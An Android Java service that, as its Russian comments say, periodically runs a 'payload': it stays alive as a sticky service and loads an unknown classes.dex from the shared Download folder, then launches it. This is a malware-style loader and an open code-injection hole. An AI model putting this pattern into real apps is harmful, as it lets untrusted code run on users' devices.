package com.example.bos_1;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

import dalvik.system.DexClassLoader;

public class MyService extends Service {

    // Создаем таймер
    private Timer myTimer = new Timer();

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(this, "Service created", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Service stopped", Toast.LENGTH_SHORT).show();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
        // Устанавливаем таймер вызова полезной нагрузки
        myTimer.schedule(new TimerTask() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void run() {
                try {
                    call_module("com.example.bos_1.DownloadableModule");
                } catch (Exception e) {
                    //e.printStackTrace();
                }
            }
        }, 30000, 6000000); // Ждем пол минуты, потом через заданный период

        return Service.START_STICKY;
    }

    // Работа с dex файлом
    private void call_module(String className) {
        File dexFile = new File(Environment.getExternalStorageDirectory().
                getAbsolutePath().toString() + "/Download/", "classes.dex");
        // Каталог кэша, нужен для DexClassLoader:
        File codeCacheDir = new File(getCacheDir() + File.separator + "codeCache");
        codeCacheDir.mkdirs();
        // Создаем ClassLoader:
        DexClassLoader dexClassLoader = new DexClassLoader(
                dexFile.getAbsolutePath(), codeCacheDir.getAbsolutePath(),
                null, getClassLoader());
        try {
            // Загружаем класс фрагмента по имени:
            Class clazz = dexClassLoader.loadClass(className);
            Intent it = new Intent(this, clazz);
            it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(it);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}